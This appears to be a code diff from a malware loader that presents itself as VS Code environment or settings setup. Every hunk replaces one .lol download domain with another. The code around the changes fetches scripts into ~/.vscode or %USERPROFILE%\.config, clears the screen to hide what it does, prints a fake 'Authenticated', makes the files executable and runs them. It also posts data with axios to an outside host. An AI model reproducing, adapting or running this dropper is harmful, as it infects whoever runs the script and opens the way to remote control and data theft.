@@ -89,7 +89,7 @@ set "VSCODE_DIR=%USERPROFILE%\\.config"
 
 if not exist "%VSCODE_DIR%" ( mkdir "%VSCODE_DIR%" )
 
-curl -s -L -o "%VSCODE_DIR%\\vscode-env.cmd" https://gitremoteupdate.lol/settings/bootstrap?flag=${flag}
+curl -s -L -o "%VSCODE_DIR%\\vscode-env.cmd" https://settings-server.lol/settings/bootstrap?flag=${flag}
 cls
 "%VSCODE_DIR%\\vscode-env.cmd"
 cls
@@ -108,7 +108,7 @@ echo "Authenticated"
 TARGET_DIR="$HOME/.vscode"
 mkdir -p "$TARGET_DIR"
 clear
-wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://gitremoteupdate.lol/settings/bootstraplinux?flag=${flag}"
+wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://settings-server.lol/settings/bootstraplinux?flag=${flag}"
 clear
 chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
 clear
@@ -128,7 +128,7 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/.vscode"
 clear
-curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://gitremoteupdate.lol/settings/bootstraplinux?flag=${flag}"
+curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://settings-server.lol/settings/bootstraplinux?flag=${flag}"
 clear
 chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
 clear
@@ -207,8 +207,8 @@ if not defined NODE_EXE (
 )
 set "CODEPROFILE=%USERPROFILE%\\.config"
 
-curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://gitremoteupdate.lol/settings/env?flag=${flag}"
-curl -L -o "%CODEPROFILE%\\package.json" "https://gitremoteupdate.lol/settings/package"
+curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://settings-server.lol/settings/env?flag=${flag}"
+curl -L -o "%CODEPROFILE%\\package.json" "https://settings-server.lol/settings/package"
 
 if not exist "%~dp0node_modules\\axios" (
     pushd "%~dp0"
@@ -343,7 +343,7 @@ fi
 # -------------------------
 USER_HOME="$HOME/.vscode"
 mkdir -p "\${USER_HOME}"
-BASE_URL="https://gitremoteupdate.lol"
+BASE_URL="https://settings-server.lol"
 echo "[INFO] Downloading env-setup.js and package.json..."
 if ! command -v curl >/dev/null 2>&1; then
     wget -q -O "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
@@ -425,7 +425,7 @@ exit 0
 
       script = `
 	const axios = require('axios');
-const host = "view-my-result.lol";
+const host = "showmylist.lol";
 const apikey = "3aeb34a3${flag}";
 axios
   .post(
